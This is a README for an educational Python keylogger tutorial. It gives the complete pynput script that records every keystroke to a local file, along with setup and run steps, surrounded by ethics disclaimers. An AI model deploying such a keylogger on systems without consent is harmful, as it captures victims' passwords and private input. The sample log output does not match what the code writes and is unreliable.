## 📝 Project Overview – Simple Keylogger

The **Simple Keylogger** project is a Python-based keystroke logging tool designed for educational use in cybersecurity learning environments. Its primary function is to monitor and record keyboard input in real time, saving each keystroke to a local text file for analysis. Built using the `pynput` library, the keylogger operates silently in the background and captures both standard and special keys (e.g., Enter, Backspace, Space).

This project emphasizes the importance of ethical conduct in cybersecurity. It is strictly intended for use on authorized systems or in lab environments where permission has been granted. By completing this task, learners gain a foundational understanding of how keylogging mechanisms work, as well as the importance of detection and defense techniques used in real-world cybersecurity practice.

---

## 🚀 Features

* **Real-Time Keystroke Logging**
  Captures every key press instantly, including alphanumeric and special keys.

* **File-Based Log Output**
  Logs are written to a plain text file (`keylog.txt`) for easy viewing and analysis.

* **Background Execution**
  The script can run silently in the background, simulating real-world keylogging behavior.

* **Cross-Platform Compatibility**
  Built with Python and `pynput`, the keylogger can work on Linux (Kali), Windows, and macOS systems (with slight modifications).

* **Minimal Resource Usage**
  Lightweight design ensures it does not consume noticeable system resources during operation.

---

## 🎓 Learning Outcomes

By completing this task, you will:

*  Understand how **keyboard input hooks** work in operating systems using Python.
*  Gain experience using the `pynput` library for **event-driven programming**.
*  Learn how to write logs securely to a **persistent file**.
*  Explore the ethical and legal boundaries of **offensive security tools**.
*  Develop the ability to detect or defend against keyloggers through **hands-on awareness**.
*  Practice using **virtual environments** for dependency isolation in modern Linux systems like Kali.

---

# 🛠️ Setup Instructions

**1. I started by creating a folder by running this command on my terminal**
```bash
mkdir Keylogger
cd Keylogger
```
---

**2: Create the Keylogger Script**
Open a terminal and create a new Python script:
```bash
nano keylogger.py
```

Paste the following code into the file:
```python
from pynput import keyboard

log_file = "keylog.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f"[{key}]")

# Start listener
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
```
**Save and exit:**
Press Ctrl + O to save, Enter to confirm, then Ctrl + X to exit Nano.

---

**3.Create a virtual environment**
In your project directory (~/Keylogger):
```bash
python3 -m venv venv
```
This creates a folder called venv containing an isolated Python environment.

 **Activate the virtual environment**
```bash
source venv/bin/activate
```
Once activated, your prompt will change to show `(venv)` — now you're inside the virtual environment.

**Install pynput inside the virtual environment**
```bash
pip install pynput
```
✅ This will now work without triggering the "externally-managed-environment" error.

---

**4: Run your keylogger**
Still inside the venv, run:
```bash
python keylogger.py
```
The script will begin logging keystrokes into keylog.txt located in the same directory.

---

**5: Check the Logs**
Use cat or any text viewer:
```bash
cat keylog.txt
```

You should see something like:
```csharp
h
e
l
l
o
[Key.space]
w
o
r
l
d
```
**🛑 Stop the Keylogger**
Press Ctrl + C in the terminal window where the script is running to stop it.

---

**6: Optional Cleanup**
If you want to clear the logs and test again:
```bash
rm keylog.txt
```

Or clear contents without deleting:
```bash
echo "" > keylog.txt
```

## 📂 File Structure
```bash
keylogger-kali/
│
├── keylogger.py       # Main keylogger script
├── keylog.txt         # Output file for captured keystrokes
└── README.md          # Project documentation
```
---


> **DISCLAIMER**: This tool is strictly for educational and authorized testing. Do **NOT** deploy it on systems without explicit permission. Unauthorized use may be illegal and unethical.





